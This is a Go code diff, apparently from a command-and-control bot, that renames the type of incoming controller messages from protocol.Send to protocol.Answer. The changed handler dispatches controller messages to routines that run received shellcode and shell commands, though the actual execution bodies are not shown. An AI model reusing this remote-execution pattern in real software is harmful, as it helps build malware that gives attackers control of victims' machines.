@@ -55,7 +55,7 @@ func (h *handler) log(lv logger.Level, log ...interface{}) {
 // [2020-01-30 15:13:07] [info] <handler> foo logf
 // spew output...
 //
-// first log interface must be *protocol.Send
+// first log interface must be *protocol.Answer
 func (h *handler) logfWithInfo(lv logger.Level, format string, log ...interface{}) {
 	buf := new(bytes.Buffer)
 	_, _ = fmt.Fprintf(buf, format, log[1:]...)
@@ -68,7 +68,7 @@ func (h *handler) logfWithInfo(lv logger.Level, format string, log ...interface{
 // [2020-01-30 15:13:07] [info] <handler> foo log
 // spew output...
 //
-// first log interface must be *protocol.Send
+// first log interface must be *protocol.Answer
 func (h *handler) logWithInfo(lv logger.Level, log ...interface{}) {
 	buf := new(bytes.Buffer)
 	_, _ = fmt.Fprintln(buf, log[1:]...)
@@ -83,35 +83,39 @@ func (h *handler) logPanic(title string) {
 	}
 }
 
-func (h *handler) OnMessage(send *protocol.Send) {
+// OnMessage is used to handle message from Controller.
+// <warning> the function must be block, you can't not use
+// answer *protocol.Answer in go func(), if you want to use it,
+// must copy it, because answer is from sync.Pool.
+func (h *handler) OnMessage(answer *protocol.Answer) {
 	defer h.logPanic("handler.OnMessage")
-	if len(send.Message) < 4 {
+	if len(answer.Message) < 4 {
 		const log = "controller send with invalid size"
-		h.logWithInfo(logger.Exploit, send, log)
+		h.logWithInfo(logger.Exploit, answer, log)
 		return
 	}
-	msgType := convert.BytesToUint32(send.Message[:4])
-	send.Message = send.Message[4:]
+	msgType := convert.BytesToUint32(answer.Message[:4])
+	answer.Message = answer.Message[4:]
 	switch msgType {
 	case messages.CMDExecuteShellCode:
-		h.handleExecuteShellCode(send)
+		h.handleExecuteShellCode(answer)
 	case messages.CMDShell:
-		h.handleShell(send)
+		h.handleShell(answer)
 	case messages.CMDTest:
-		h.handleSendTestMessage(send)
+		h.handleSendTestMessage(answer)
 	default:
 		const format = "controller send unknown message\ntype: 0x%08X\n%s"
-		h.logf(logger.Exploit, format, msgType, spew.Sdump(send))
+		h.logf(logger.Exploit, format, msgType, spew.Sdump(answer))
 	}
 }
 
-func (h *handler) handleExecuteShellCode(send *protocol.Send) {
+func (h *handler) handleExecuteShellCode(answer *protocol.Answer) {
 	defer h.logPanic("handler.handleExecuteShellCode")
 	es := new(messages.ExecuteShellCode)
-	err := msgpack.Unmarshal(send.Message, es)
+	err := msgpack.Unmarshal(answer.Message, es)
 	if err != nil {
 		const log = "controller send invalid shellcode"
-		h.logWithInfo(logger.Exploit, send, log)
+		h.logWithInfo(logger.Exploit, answer, log)
 		return
 	}
 	go func() {
@@ -124,13 +128,13 @@ func (h *handler) handleExecuteShellCode(send *protocol.Send) {
 	}()
 }
 
-func (h *handler) handleShell(send *protocol.Send) {
+func (h *handler) handleShell(answer *protocol.Answer) {
 	defer h.logPanic("handler.handleShell")
 	s := new(messages.Shell)
-	err := msgpack.Unmarshal(send.Message, s)
+	err := msgpack.Unmarshal(answer.Message, s)
 	if err != nil {
 		const log = "controller send invalid shell"
-		h.logWithInfo(logger.Exploit, send, log)
+		h.logWithInfo(logger.Exploit, answer, log)
 		return
 	}
 	go func() {
@@ -151,14 +155,14 @@ func (h *handler) handleShell(send *protocol.Send) {
 	}()
 }
 
-func (h *handler) handleSendTestMessage(send *protocol.Send) {
+func (h *handler) handleSendTestMessage(answer *protocol.Answer) {
 	defer h.logPanic("handler.handleSendTestMessage")
 	if !h.ctx.Test.testMsgEnabled {
 		return
 	}
-	err := h.ctx.Test.AddSendTestMessage(h.context, send.Message)
+	err := h.ctx.Test.AddSendTestMessage(h.context, answer.Message)
 	if err != nil {
 		const log = "failed to add send test message\nerror:"
-		h.logWithInfo(logger.Fatal, send, log, err)
+		h.logWithInfo(logger.Fatal, answer, log, err)
 	}
 }
